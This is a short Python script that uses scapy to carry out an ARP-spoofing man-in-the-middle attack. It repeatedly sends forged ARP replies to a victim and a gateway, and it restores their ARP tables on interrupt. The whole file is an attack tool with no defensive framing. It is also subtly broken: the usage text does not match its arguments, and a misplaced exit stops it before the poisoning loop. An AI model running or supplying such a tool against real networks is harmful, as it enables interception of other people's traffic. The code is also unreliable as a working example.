from scapy.all import *
import sys
import os
import time


def help_text():
    print("\nUsage:\n python3 mitm.py network-range\n")
    sys.exit()

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP():

    print("Restoring Targets")
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
    print("Shutting Down")
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def mitm():
    while True:
        try:
            victimMAC = get_mac(victimIP)
        except Exception:
            print("Couldn't Find Victim MAC Address")
            print( "Exiting...")
        sys.exit()
        try:
            gatewayMAC = get_mac(gatewayIP)
        except Exception:
            print("Couldn't Find Gateway MAC Address")
            print("Exiting...")
            sys.exit()
        print("Poisoning Targets..."  )  
        while True:
            try:
                trick(gatewayMAC, victimMAC)
                time.sleep(1.5)
            except KeyboardInterrupt:
                reARP()
                break

if __name__ == '__main__':
    if len(sys.argv) < 2:
        help_text()
    interface = sys.argv[1]
    victimIP = sys.argv[2]
    gatewayIP = sys.argv[3] 
    mitm()